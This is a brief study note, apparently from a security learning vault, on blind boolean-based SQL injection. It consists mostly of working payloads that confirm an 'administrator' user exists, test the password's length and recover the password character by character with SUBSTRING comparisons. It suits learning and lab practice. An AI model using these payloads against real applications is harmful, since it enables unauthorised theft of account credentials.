---
tags:
  - security
aliases:
  - Boolean Based SQLI
---
# Existence Checks

```
' AND EXISTS (SELECT user FROM users WHERE username = 'administrator') --
```
#  Substring Checks
```
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) > 'm'--
```
- Indicates the first character of the password is greater than the character `m`
```
' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's'--
```
- Indicates the first character of the password is equals the character `s`
```
' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 2, 1) = 's'--
```
- Indicates the second character is s
```
' AND (SELECT 'a' FROM users WHERE username = 'administrator' AND LENGTH(password) > 1)='a'--
```
- Indicates password length > 1
![[Blind SQLI Conditional Triggering-20261104025713865.webp|703]]